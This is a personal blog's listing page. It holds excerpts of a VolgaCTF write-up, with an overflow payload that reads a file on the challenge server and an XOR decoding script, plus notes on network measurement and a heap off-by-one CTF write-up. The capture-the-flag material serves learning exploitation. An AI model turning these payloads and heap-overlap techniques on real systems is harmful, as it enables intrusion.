<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
    <title>Posts - Yuuoniy&#39;s blog</title>
    
    <meta name="description" content="">
    <meta name="author" content="">
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/an-old-hope.min.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/style.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/custom.css" rel="stylesheet">
    
    <link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
    <link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
    <meta name="generator" content="Hugo 0.76.5" />
    
    <link rel="alternate" type="application/rss+xml" href="https://yuuoniy.github.io/posts/index.xml" title="Yuuoniy's blog" />
    
    
    <script>
      function setTheme() {
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
          document.body.classList.add('dark');
          return;
        }

        const time = new Date();
        const prev = localStorage.getItem('date');
        const date = String(time.getMonth() + 1) + '.' + String(time.getDate());

        const now = time.getTime();
        let sunrise;
        let sunset;

        function setBodyClass() {
          if (now > sunrise && now < sunset) return;
          document.body.classList.add('dark');
        }

        if (date !== prev) {
          fetch('https://api.ipgeolocation.io/astronomy?apiKey=5ed37d85103e4defa5df4c5298ed5215')
            .then((res) => res.json())
            .then((data) => {
              sunrise = data.sunrise.split(':').map(Number);
              sunset = data.sunset.split(':').map(Number);
            })
            .catch(() => {
              sunrise = [7, 0];
              sunset = [19, 0];
            })
            .finally(() => {
              sunrise = time.setHours(sunrise[0], sunrise[1], 0);
              sunset = time.setHours(sunset[0], sunset[1], 0);
              setBodyClass();
              localStorage.setItem('sunrise', sunrise);
              localStorage.setItem('sunset', sunset);
            });
          localStorage.setItem('date', date);
        } else {
          sunrise = Number(localStorage.getItem('sunrise'));
          sunset = Number(localStorage.getItem('sunset'));
          setBodyClass();
        }
      }
    </script>
  </head>
  <body class="list">
    <script>
      setTheme();
    </script>
    <header class="header">
      <nav class="nav">
        <p class="logo"><a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></p>
        <ul class="menu">
          <li>
            <a href="/posts/">Posts</a>
          </li>
          <li>
            <a href="/tags/">Tags</a>
          </li>
          <li>
            <a href="/about/">About</a>
          </li>
          <li>
            <a href="/index.xml">RSS</a>
          </li>
        </ul>
      </nav>
    </header>
    <main class="main">
 

 
		<header class="page-header">
				<h1>Posts</h1>
			
		</header>


<article class="post-entry">
	<header class="entry-header">
		<h2>2019VolgaCTF &amp; 2019SunshineCTF writeup</h2>
	</header>
	<section class="entry-content">
	 <p>VolgaCTF:  warm/Shadow Cat/JOI  Warm 这道题是 arm 架构下的，不过没什么区别。没有环境的话要先搭一下，直接连服务器做也可以。
先简单解个密：
s=&#34;&#34; s&#43;=chr(0x23^85); s&#43;= chr(ord(s[-1])^78) s&#43;= chr(ord(s[-1])^30) s&#43;= chr(ord(s[-1])^21) s&#43;= chr(ord(s[-1])^94) s&#43;= chr(ord(s[-1])^28) s&#43;= chr(ord(s[-1])^33) s&#43;= chr(ord(s[-1])^1) s&#43;= chr(ord(s[-1])^52) s&#43;= chr(ord(s[-1])^7) s&#43;= chr(ord(s[-1])^53) s&#43;= chr(ord(s[-1])^17) s&#43;= chr(ord(s[-1])^55) s&#43;= chr(ord(s[-1])^60) s&#43;= chr(ord(s[-1])^114) s&#43;= chr(ord(s[-1])^71) p.sendline(s); print(len(s)) print(s) 得到 v8&amp;3mqPQebWFqM?x
程序很明显有溢出，进行覆盖可以读取任意文件，接下来就靠猜了…
文件名是 sacred
payload: v8&amp;3mqPQebWFqM?xpppppppppppppppppppppppppppppppppppppaaaaaaabbbbbxppppppppppppppppppppppppppppppppppsacred
flag: VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}
ShadowCat 用 john 进行破解，首先用默认的字典，发现破解速度极慢，破解出来的都是单字符，想想也是… 所以自己创建一个可打印字符的字典，使用 –wordlist 设置破解就好了，最后把破解得到的数据与密文对应的字符进行替换，得到
脚本：
str = &#34;hajjzvajvzqyaqbendzvajvqauzarlapjzrkybjzenzuvczjvastlj&#34; ans = &#34;&#34; dict = {&#34;z&#34;:&#34;_&#34;,&#34;a&#34;:&#34;a&#34;,&#34;x&#34;:&#34;b&#34;,&#34;q&#34;:&#34;c&#34;,&#34;l&#34;:&#34;w&#34;,&#34;v&#34;:&#34;h&#34;,&#34;e&#34;:&#34;i&#34;,&#34;f&#34;:&#34;j&#34;,&#34;b&#34;:&#34;k&#34;,&#34;r&#34;:&#34;l&#34;,&#34;g&#34;:&#34;m&#34;,&#34;n&#34;:&#34;n&#34;,&#34;o&#34;:&#34;x&#34;,&#34;p&#34;:&#34;y&#34;,&#34;s&#34;:&#34;d&#34;,&#34;c&#34;:&#34;e&#34;,&#34;w&#34;:&#34;f&#34;,&#34;d&#34;:&#34;g&#34;,&#34;t&#34;:&#34;o&#34;,&#34;h&#34;:&#34;p&#34;,&#34;m&#34;:&#34;q&#34;,&#34;k&#34;:&#34;u&#34;,&#34;i&#34;:&#34;v&#34;,&#34;y&#34;:&#34;r&#34;,&#34;j&#34;:&#34;s&#34;,&#34;u&#34;:&#34;t&#34;} for ch in str: ans&#43;=dict[ch]; print(ans) flag: pass_hash_cracking_hashcat_always_lurks_in_the_shadows...</p>
	</section>
	<footer class="entry-footer">
		<time>April 2, 2019</time>
	</footer>
	<a class="entry-link" aria-label="link to 2019VolgaCTF &amp; 2019SunshineCTF writeup post" href="https://yuuoniy.github.io/posts/2019volgactfsunshine/"></a>
</article>
<article class="post-entry">
	<header class="entry-header">
		<h2>互联网络测量读书笔记</h2>
	</header>
	<section class="entry-content">
	 <p>《互联网络测量理论与应用》读书笔记
a b 主动测量 被动测量 BGP 优点 容易得到大量的 AS 级的拓扑连接信息。
缺点  由 BGP 的路由信息生成的 AS 级拓扑结构是个类似树状的结构， AS 间可能存在的任何交叉连接都难以被发现 对 BGP 信息进行路由汇集和过滤的过程中可能会隐藏掉该 AS 的边缘信息  OSPF 开放最短路径优先协议，也属于内部网关协议。在链路状态路由协议中，每个路由器维护它自己的本地链路状态信息，即路由器到子网的链路状态和可以到达的邻居路由器，并且通过洪泛的方法把更新了的本地链路状态信息广播给自治系统中每个路由器。
优点 信息收集比较简单，且速度快
缺点  要求所有的路由器都支持 OSPF 协议， 收集到的拓扑信息中缺乏接口之间的联系关系，这给基于该方法的拓扑测量带来困难  SNMP//RMON SNMP是 IETF 为Internet 管理而设计的信息交换协议。RMON 是 IETF 制定的一种特殊的 SNMP MIB，主要用于远程监控局域网。
tcpdump tcpdump 是一种可以记录网络流量的网络检测工具。
混合测量 网络测量体系结构 被动测量体系结构 RTFM 监听模块、读取模块、控制模块、分析模块。
抽象测量体系结构 数据采集、数据管理、数据分析、数据表示
集中式测量体系结构 简单的分布式测量体系结构 基于 P2P 的分布式测量体系结构 基于 web service 的分布式测量体系结构 基础设施部署的关键问题 测量点的选择 噪声分组的过滤 时钟同步 匿名化 误差和校准 网络性能测量 性能指标 时延 传输时延、传播时延、路由器时延 端到端时延...</p>
	</section>
	<footer class="entry-footer">
		<time>October 1, 2018</time>
	</footer>
	<a class="entry-link" aria-label="link to 互联网络测量读书笔记 post" href="https://yuuoniy.github.io/posts/network-measurement-notes-1/"></a>
</article>
<article class="post-entry">
	<header class="entry-header">
		<h2>CTF | offbyone writeup</h2>
	</header>
	<section class="entry-content">
	 <p>offbyone fastbin attack chunk overlap
题目就叫 offbyone，是 xman 小姐姐给的，不清楚出处…
offbyone 漏洞的大致思路：
 改写下一个块的size 改写下一个块的pre inuse位 chunk overlap ： Overwrite next chunk’s size =&gt; extend free chunk Overwrite next chunk’s size =&gt; extend allocated chunk Overwrite next chunk’s size =&gt; shrink free chunk  这道题的 offbyone 比较宽松，可以写任意字节，而不仅仅是 null
程序分析 edit 函数有 offbyone：
if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 15 &amp;&amp; ptrs[v1] ) { puts(&#34;your note:&#34;); v2 = strlen(ptrs[v1]); read(0, (void *)ptrs[v1], v2); puts(&#34;done....</p>
	</section>
	<footer class="entry-footer">
		<time>September 27, 2018</time>
	</footer>
	<a class="entry-link" aria-label="link to CTF | offbyone writeup post" href="https://yuuoniy.github.io/posts/pwn-offbyone/"></a>
</article> 
<footer class="page-footer">
	<nav class="pagination">
		<a class="prev" href="/posts/page/4/">← Prev Page</a>
		<a class="next" href="/posts/page/6/">Next Page →</a>
	</nav>
</footer></main>
<footer class="footer">
	<span>
		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
		
	</span>
	<span>&middot;</span>
	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
</footer>
<script src="https://yuuoniy.github.io/highlight.min.js"></script>
<script>
	hljs.initHighlightingOnLoad();
</script>
</body>
</html>
 
